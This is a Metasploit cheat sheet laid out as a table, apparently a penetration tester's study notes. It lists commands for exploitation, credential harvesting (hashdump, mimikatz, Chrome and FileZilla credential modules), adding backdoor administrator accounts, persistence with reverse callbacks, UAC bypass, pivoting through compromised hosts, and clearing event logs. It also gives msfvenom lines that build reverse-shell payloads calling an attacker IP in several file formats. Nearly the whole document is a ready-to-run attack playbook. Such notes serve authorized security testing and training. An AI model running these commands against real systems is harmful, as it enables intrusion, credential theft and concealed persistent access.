| Metasploit                                                   |                                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| msfconsole or msfdb run (db_status)                          |                                                              |
| ? for available commands                                     |                                                              |
| systemctl enable postgresql                                  | at startup                                                   |
| show  <tab><tab>, show -h, show exploits, show payloads show auxiliary,  show post etc etc |                                                              |
| Search                                                       |                                                              |
| search type:exploit  platform:windows                        |                                                              |
| search vsftpd or cve:2007-2447  or searchsploit              |                                                              |
| Scanners or Exploits                                         |                                                              |
| use  auxiliary/scanner/snmp/snmp_enum                        |                                                              |
| show options                                                 |                                                              |
| info                                                         |                                                              |
| show targets                                                 |                                                              |
| Payloads                                                     |                                                              |
| set payload  windows/meterpreter/reverse_tcp                 |                                                              |
| run or exploit                                               |                                                              |
| Sessions                                                     |                                                              |
| sessions [-l]  showing a list of sessions                    |                                                              |
| sessions -i 1  for interacting with session 1                |                                                              |
| background                                                   |                                                              |
|                                                              |                                                              |
| Install module                                               |                                                              |
| https://medium.com/@pentest_it/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d |                                                              |
|                                                              |                                                              |
| Info in database                                             |                                                              |
| help database                                                |                                                              |
|                                                              |                                                              |
| hosts, services,loot,creds                                   |                                                              |
| services -p 443                                              |                                                              |
| db_nmap                                                      |                                                              |
|                                                              |                                                              |
| workspace [-h]                                               |                                                              |
| workspace msfu                                               |                                                              |
| workspace -a new one;  workspace -d deleteone                |                                                              |
|                                                              |                                                              |
| db_import nmap_scan.xml                                      |                                                              |
|                                                              |                                                              |
| load wmap                                                    |                                                              |
|                                                              |                                                              |
| Post exploitation                                            |                                                              |
| Information [help]                                           |                                                              |
| ifconfig, sysinfo, pwd,  getuid, ps, getpid, getprivs        |                                                              |
|                                                              |                                                              |
| search post/windows  post/linux; show post                   |                                                              |
| post/multi/recon/local_exploit_suggester                     |                                                              |
|                                                              |                                                              |
| run  post/linux/gather/enum_configs                          | Collects all the most vital configuration files on a system. |
| run  post/linux/gather/enum_system                           | Collects system information of a system.                     |
|                                                              |                                                              |
| run post/multi/gather/                                       | other gathering scripts                                      |
| run post/windows/gather/                                     | Lists all Meterpreter pillaging scripts.                     |
| run  post/windows/gather/enum_services                       | Obtain all running services on a Windows machine.            |
| run  post/windows/gather/enum_domains                        | Determine what domains target is in.                         |
| run  post/windows/gather/enum_ad_users                       | Enumerates accounts in active domain.                        |
| run  post/windows/gather/enum_shares                         | Lists all shared resources on system.                        |
| meterpreter > run scraper                                    | Runs pillage automation script.                              |
| meterpreter > run winenum                                    | Runs Windows pillage automation script.                      |
| meterpreter > run netenum                                    | Network Enumerator Meterpreter Script                        |
| run post/windows/gather/credentials                          | Searches for credentials on a system.                        |
| run post/gather/enum_chrome                                  | Searches for credentials stored in Google Chrome.            |
| run  post/windows/gather/enum_application                    | Lists installed software on system.                          |
| run post/multi/gather/filezilla_client_cred                  |                                                              |
|                                                              |                                                              |
| run arp_scanner –r  10.32.120.0/24                           | arp_scanner to identify devices within the same VLAN by IP and  MAC |
| use  post/windows/gather/arp_scanner                         | alternate arp_scanner to identify devices within the same VLAN  by IP and MAC |
| use  auxiliary/scanner/portscan/tcp                          | post module to do a port scan on a remote host               |
|                                                              |                                                              |
| run getgui -e                                                | Meterpreter post  payload to enable RDP                      |
|                                                              |                                                              |
| Add user                                                     |                                                              |
| net user EveUser EvePass /add                                |                                                              |
| net localgroup  "Administrators" EveUser /add                |                                                              |
| net localgroup "Remote  Desktop Users" EveUser /add etc etc  |                                                              |
|                                                              |                                                              |
| Privileges                                                   |                                                              |
| search post/windows                                          |                                                              |
| search post/windows/gather                                   |                                                              |
| search post/windows/migrate                                  |                                                              |
| search exploit/windows/local                                 |                                                              |
| search post/multi/gather                                     |                                                              |
|                                                              |                                                              |
| getprivs                                                     |                                                              |
| run  post/windows/gather/win_privs                           | Post module about current access privs                       |
| run  post/windows/manage/migrate                             | To let Metasploit automatically migrate to another process   |
| migrate <pid>                                                |                                                              |
| sudo -l                                                      |                                                              |
|                                                              |                                                              |
| getsystem (only windows without  UAC disabled) -> rev2self to get back to original |                                                              |
| search bypassuac                                             |                                                              |
| /post/windows/gather/win_privs  to see if UAC is enabled     |                                                              |
| list_tokens or  impersonate_token els\\els                   |                                                              |
|                                                              |                                                              |
| meterpreter > background                                     |                                                              |
| use  exploit/windows/local/bypassuac                         | PrivEsc to use if your meterpreter session process is in the  admin group but is not an admin. After setting options go back to meterpreter  and getsystem |
| run getsystem again ->  getuid to check                      |                                                              |
|                                                              |                                                              |
| use incognito                                                | Ability to impersonate users/admins and then map network  shares as them, see lab 9 (NetBios) |
|                                                              |                                                              |
| use  post/multi/recon/local_exploit_suggester                |                                                              |
|                                                              |                                                              |
| Windows                                                      |                                                              |
| use exploit/windows/local                                    |                                                              |
| exploit/windows/local/service_permissions                    |                                                              |
| run post/windows                                             |                                                              |
|                                                              |                                                              |
| Linux                                                        |                                                              |
| run post/linux                                               |                                                              |
|                                                              |                                                              |
| Shell and search                                             |                                                              |
| shell , exit                                                 | start the local shell; windows and linux                     |
| Search for a file                                            |                                                              |
| search -f *pass*.txt`                                        |                                                              |
| search -d C:\\Users\\els\\ -f  *.kdbx                        | -d= path -f= file pattern                                    |
| Upload a file                                                |                                                              |
| upload  /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec` |                                                              |
| Download a file                                              |                                                              |
| download  c:\\Windows\\system32\\calc.exe /tmp/calc.exe`     |                                                              |
|                                                              |                                                              |
| Persistence [backdoor, new account, password hash,  software] |                                                              |
| run persistence -h -> post/windows/manage/persistence_exe    |                                                              |
| run persistence -A -X -p 5555  -r 192.168.100.1              |                                                              |
| run  persistence -A -U -i 20 -p 80 -r 192.168.100.1 -> start exploit/multi/handler to listen |                                                              |
| Veil-evasion + metasploit                                    |                                                              |
| use  exploit/windows/local/persistence -> show advanced -> set EXE::Custom  /var/www/ |                                                              |
|                                                              |                                                              |
| Enable RDP                                                   |                                                              |
| net start                                                    |                                                              |
| wmic  service where 'Caption like "Remote%" and started=true' get Caption |                                                              |
|                                                              |                                                              |
| With Meterpreter                                             |                                                              |
| run service_manager -l or   run post/windows/gather/enum_services | use meterpreter scripts to check services                    |
| run getgui -e                                                | Meterpreter post  payload to enable RDP                      |
|                                                              |                                                              |
| Add user                                                     |                                                              |
| net user EveUser EvePass /add                                |                                                              |
| net localgroup  "Administrators" EveUser /add                |                                                              |
| net localgroup "Remote  Desktop Users" EveUser /add etc etc  |                                                              |
|                                                              |                                                              |
| Hashdump                                                     |                                                              |
| hashdump on windows                                          | To bypass this error you have two options: 1) execute run  hashdump or 2) migrate to a different process. |
| run post/linux/gather/hashdump                               |                                                              |
| Example pass the hash                                        | only works if we use an administrator account on the current meterpreter session |
| ms08-067  -> hashdump -> use auxiliary/scanner/smb/psexec_scanner |                                                              |
| use exploit/windows/smb/psexec                               |                                                              |
|                                                              |                                                              |
| Mimikatz                                                     | it is important to have the current meterpreter session  running on a 64-bit process |
| extract plaintexts passwords,  hash, PIN code and kerberos   |                                                              |
| tickets from memory. mimikatz  can also perform              |                                                              |
| pass-the-hash, pass-the-ticket  or build Golden tickets      |                                                              |
| [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz) |                                                              |
|                                                              |                                                              |
| load mimikatz, help mimikatz                                 |                                                              |
| From metasploit meterpreter  (must have System level access): |                                                              |
| meterpreter> load mimikatz                                   |                                                              |
| meterpreter> help mimikatz                                   |                                                              |
| meterpreter> msv                                             |                                                              |
| meterpreter> kerberos                                        |                                                              |
| mimikatz_command -f xyz::  to show list of modules           |                                                              |
| meterpreter>  mimikatz_command -f samdump::hashes            |                                                              |
| meterpreter>  mimikatz_command -f sekurlsa::searchPasswords  |                                                              |
|                                                              |                                                              |
| Pivoting                                                     |                                                              |
| https://pentest.blog/explore-hidden-networks-with-double-pivoting/ |                                                              |
| https://artkond.com/2017/03/23/pivoting-guide/               |                                                              |
|                                                              |                                                              |
| run arp_scanner -r  network/mask [192.168.100.0/24]          |                                                              |
| run  post/multi/gather/ping_sweep                            |                                                              |
|                                                              |                                                              |
| Routing from Metasploit  exploit                             |                                                              |
| use  post/multi/manage/autoroute                             |                                                              |
| set session 1                                                |                                                              |
| run                                                          |                                                              |
|                                                              |                                                              |
| use auxiliary/server/socks4a                                 |                                                              |
| set SRVHOST 175.12.80.21                                     | adress of VPN tunnel                                         |
| run                                                          |                                                              |
|                                                              |                                                              |
| run autoroute -h                                             |                                                              |
| run autoroute from meterpreter  session-s 10.32.121.0/24     |                                                              |
| meterpreter > run autoroute  -s 10.10.10.0/24                | Adds a route from Meterpreter sessions                       |
| run  post/multi/manage/autoroute                             |                                                              |
| run autoroute -p                                             | Check the current routing table                              |
|                                                              |                                                              |
| use  auxiliary/scanner/portscan/tcp                          | Scan the added network from Metasploit                       |
| route flush                                                  | Delete added route                                           |
|                                                              |                                                              |
| route add target_network target_mask session#                | Add a route from Metasploit                                  |
| [msf > route add 10.10.10.0  255.255.255.0 2]                |                                                              |
| route print                                                  | Check the routing table                                      |
|                                                              |                                                              |
| use a bind payload for the  second target !                  |                                                              |
|                                                              |                                                              |
| If  not through metasploit but use programs from computer then also use  proxychains |                                                              |
| background                                                   |                                                              |
| msf > use  auxiliary/server/socks4a                          |                                                              |
| run                                                          |                                                              |
|                                                              |                                                              |
| echo "socks4 127.0.0.1  1080 >> /etc/proxychains.conf        | edit /etc/proxychains.conf to include "socks4 127.0.0.1  SRVPORT" where SRVPORT is whatever port you chose |
| proxychains nmap -sT -n -Pn -p  21 10.10.10.1                |                                                              |
| proxychains telnet 10.10.10.1                                |                                                              |
|                                                              |                                                              |
| Port forwarding [in addition  to the added route]            |                                                              |
| meterpreter > portfwd add  -l 3333 -p 3389 -r 10.10.10.5     | the following command will open a listener on our local IP  address on port 3333, and will forward the connection to the IP address  10.10.10.5 on port 3389 |
| rdesktop 127.0.0.1:3333                                      | establish an RDP session to our local IP address on port 3333 |
| portfwd list                                                 |                                                              |
|                                                              |                                                              |
| ----------------- [+]  Metasploit Pivot                      |                                                              |
| Compromise 1st machine                                       |                                                              |
|                                                              |                                                              |
| # meterpreter> run  arp_scanner -r 10.10.10.0/24             |                                                              |
| route add 10.10.10.10  255.255.255.248 <session>             |                                                              |
| use  auxiliary/scanner/portscan/tcp                          |                                                              |
| use bind shell                                               |                                                              |
|                                                              |                                                              |
| or run autoroute:                                            |                                                              |
| # meterpreter > ipconfig                                     |                                                              |
| # meterpreter > run  autoroute -s 10.1.13.0/24               |                                                              |
| # meterpreter > getsystem                                    |                                                              |
| # meterpreter > run  hashdump                                |                                                              |
| # use  auxiliary/scanner/portscan/tcp                        |                                                              |
| # msf auxiliary(tcp) > use  exploit/windows/smb/psexec       |                                                              |
|                                                              |                                                              |
| or port forwarding:                                          |                                                              |
| # meterpreter > run  autoroute -s 10.1.13.0/24               |                                                              |
| # use  auxiliary/scanner/portscan/tcp                        |                                                              |
| #  meterpreter > portfwd add -l <listening port> -p <remote port>  -r <remote/internal host> |                                                              |
|                                                              |                                                              |
| or socks proxy:                                              |                                                              |
| route add 10.10.10.10  255.255.255.248 <session>             |                                                              |
| use auxiliary/server/socks4a                                 |                                                              |
| Add proxy to  /etc/proxychains.conf                          |                                                              |
| proxychains nmap -sT -T4 -Pn  10.10.10.50                    |                                                              |
| setg socks4:127.0.0.1:1080                                   |                                                              |
|                                                              |                                                              |
| Cleanup                                                      |                                                              |
| clearev                                                      |                                                              |
|                                                              |                                                              |
| Bypass UAC                                                   |                                                              |
| post/windows/gather/win/_privs                               |                                                              |
| You  can bypass that restriction by using the bypassuac module (search uac), and then set session <no> and run with exploit. |                                                              |
|                                                              |                                                              |
| Msfvenom                                                     |                                                              |
| https://www.offensive-security.com/metasploit-unleashed/Msfvenom/ |                                                              |
|                                                              |                                                              |
| msfvenom  -p java/jsp_shell_reverse_tcp LHOST=10.10.14.56 LPORT=8888 -f raw >  shell.jsp |                                                              |
| msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address>  LPORT=<Your Port to Connect On> -f elf > shell.elf |                                                              |
| msfvenom  -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address>  LPORT=<Your Port to Connect On> -f exe > shell.exe |                                                              |
|                                                              |                                                              |
| msfvenom  -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o  shell_reverse.exe |                                                              |
| msfvenom  -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b  '\x00' -i 3 -f python |                                                              |
|                                                              |                                                              |
| PHP                                                          |                                                              |
| msfvenom  -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to  Connect On> -f raw > shell.php |                                                              |
| msfvenom  -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> -o meterpreter.php |                                                              |
| msfvenom  -p generic/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f php -o  shell.php |                                                              |
|                                                              |                                                              |
| -p = payload                                                 |                                                              |
| -f = output format                                           |                                                              |
| -o = out                                                     |                                                              |
| -a = architecture                                            |                                                              |
| -e = encoder                                                 |                                                              |
| -i = iterations of encoder                                   |                                                              |
| -b = bad characters to avoid  \x00\xff                       |                                                              |
| --platform = platform for the  payload                       |                                                              |
|                                                              |                                                              |
| Multi/Handler                                                |                                                              |
| use exploit/multi/handler                                    |                                                              |
| set payload ...                                              |                                                              |
| set LPORT                                                    |                                                              |
| set LHOST                                                    |                                                              |
| exploit                                                      |                                                              |
|                                                              |                                                              |
| msfvenom  -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address>  LPORT=<Your Port to Connect On> -f asp > shell.asp |                                                              |
| msfvenom  -p linux/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f js_le |                                                              |